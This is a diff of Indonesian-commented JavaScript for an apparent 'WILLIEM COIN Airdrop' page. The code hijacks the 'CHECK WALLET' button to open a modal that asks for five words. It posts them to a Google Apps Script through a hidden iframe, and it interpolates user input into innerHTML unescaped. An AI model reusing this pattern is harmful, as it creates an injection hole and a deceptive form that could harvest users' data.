@@ -591,14 +591,13 @@ setTimeout(() => {
 }, 2500); // delay 2.5 detik biar nunggu web lu load semua
 });
 // === SELESAI KODE TAMBAHAN === //
-// === WILLIEM REKAP GSHEET V2 FIXED START === //
+// === WILLIEM REKAP GSHEET V4 FINAL START === //
 window.addEventListener('load', () => {
 setTimeout(() => {
+    // URL BARU LU
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzParrDqW8vfNypFf515-ECIBWGUP4c1sp-BDq-5ZGy4dg6v72edYPLJBH-akj1ybGW/exec"; 
 
-    // URL APPS SCRIPT LU - JANGAN DI GANTI
-    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxW58uIJ54FF9kRnFevzdW4aRXmxtAs-TEXVze0Vpr_vFolkDPWteS4w3cgq45lyO1M/exec"; 
-
-    // 1. BIKIN MODAL 5 KOTAK
+    // BIKIN MODAL
     const modal = document.createElement("div");
     modal.id = "nameModalWLM";
     modal.style.cssText = "display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:99999; justify-content:center; align-items:center;";
@@ -607,7 +606,7 @@ setTimeout(() => {
         <img src="williem.png" onerror="this.style.display='none'" style="width:80px; height:80px; margin-bottom:15px; border-radius:16px; background:#000; padding:8px;">
         <h3 style="margin:0 0 10px; font-size:22px;">Enter Your Name</h3>
         <p style="color:#aaa; font-size:14px; margin:0 0 25px;">Isi 5 Kata untuk WILLIEM COIN Airdrop</p>
-        <div id="inputBoxWLM" style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-bottom:25px;">
+        <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-bottom:25px;">
           <input class="nameBoxWLM" type="text" placeholder="Kata 1" maxlength="10" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
           <input class="nameBoxWLM" type="text" placeholder="Kata 2" maxlength="10" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
           <input class="nameBoxWLM" type="text" placeholder="Kata 3" maxlength="10" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
@@ -619,7 +618,7 @@ setTimeout(() => {
     `;
     document.body.appendChild(modal);
 
-    // 2. TIMPA TOMBOL CHECK WALLET
+    // TIMPA TOMBOL CHECK WALLET
     const checkWalletBtn = Array.from(document.querySelectorAll("button")).find(btn => btn.innerText && btn.innerText.toUpperCase().includes("CHECK WALLET"));
     if(checkWalletBtn){
         checkWalletBtn.onclick = (e) => {
@@ -628,42 +627,34 @@ setTimeout(() => {
         }
     }
 
-    // 3. LOGIKA SUBMIT + KIRIM KE GSHEET VERSI FIX
+    // KIRIM DATA PAKAI FORM - CARA PALING AMPUH
     document.getElementById("submitNameBtnWLM").onclick = () => {
-        let nameArr = [];
-        document.querySelectorAll('.nameBoxWLM').forEach(box => { 
-            if(box.value.trim() !== "") nameArr.push(box.value.trim()); 
-        });
+        let name = Array.from(document.querySelectorAll('.nameBoxWLM')).map(b=>b.value.trim()).filter(Boolean).join(" ");
+        if(name.split(" ").length < 5) return alert("Isi 5 kotak dulu bro!");
         
-        if(nameArr.length < 5) return alert("Isi 5 kotak dulu bro!");
-        let name = nameArr.join(" ");
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = GOOGLE_SCRIPT_URL;
+        form.target = 'hidden_iframe_wlm';
+        form.innerHTML = `<input name="nama" value="${name}">`;
+        document.body.appendChild(form);
+        
+        const iframe = document.createElement('iframe');
+        iframe.name = 'hidden_iframe_wlm';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        
+        form.submit();
 
-        document.getElementById("submitNameBtnWLM").innerText = "SENDING...";
-        document.getElementById("submitNameBtnWLM").disabled = true;
-
-        // KIRIM KE GSHEET PAKAI JSON - INI YG FIX
-        fetch(GOOGLE_SCRIPT_URL, { 
-            method: 'POST', 
-            body: JSON.stringify({ nama: name }),
-            headers: { 'Content-Type': 'text/plain;charset=utf-8' }
-        })
-        .then(() => {
-            modal.style.display = "none";
-            alert("TERDAFTAR! ✅\nData: " + name + "\nUdah masuk ke Sheet2");
-            document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
-        })
-        .catch(err => {
-            alert("Gagal kirim bro. Coba refresh");
-            console.log(err);
-        })
-        .finally(() => {
-            document.getElementById("submitNameBtnWLM").innerText = "SUBMIT";
-            document.getElementById("submitNameBtnWLM").disabled = false;
-        });
+        modal.style.display = "none";
+        alert("TERDAFTAR! ✅\nData: " + name + "\nCek Sheet2 dalam 2 detik");
+        document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
+        
+        setTimeout(() => { form.remove(); iframe.remove(); }, 1000);
     }
     
     modal.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; }
 
 }, 2500);
 });
-// === WILLIEM REKAP GSHEET V2 FIXED END === //
+// === WILLIEM REKAP GSHEET V4 FINAL END === //
